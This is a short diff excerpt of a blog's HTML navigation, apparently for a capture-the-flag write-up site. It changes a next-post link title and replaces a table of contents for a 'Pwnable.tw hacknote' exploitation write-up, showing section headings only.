-                                <span class="post-nav-title-item">Yuawn Pwn2 rop Writeup</span>
+                                <span class="post-nav-title-item">Angr_CTF Writeups 2</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -668,8 +672,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">LYS Rop lab_rop1 Writeup</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#lab-rop1"><span class="nav-text">lab_rop1</span></a></li></ol>
+        <div class="page-title">Pwnable.tw hacknote Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnable-tw-hacknote"><span class="nav-text">Pwnable.tw - hacknote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source"><span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-Initial-Rconnaissance"><span class="nav-text">0x1 Initial Rconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hacknote"><span class="nav-text">.&#x2F;hacknote</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-Reverse-Engineering"><span class="nav-text">0x2 Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#add-note"><span class="nav-text">add_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete-note"><span class="nav-text">delete_note</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-Exploitation"><span class="nav-text">0x3 Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-Exploit"><span class="nav-text">0x4 Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-Pwned"><span class="nav-text">0x5 Pwned!!!</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
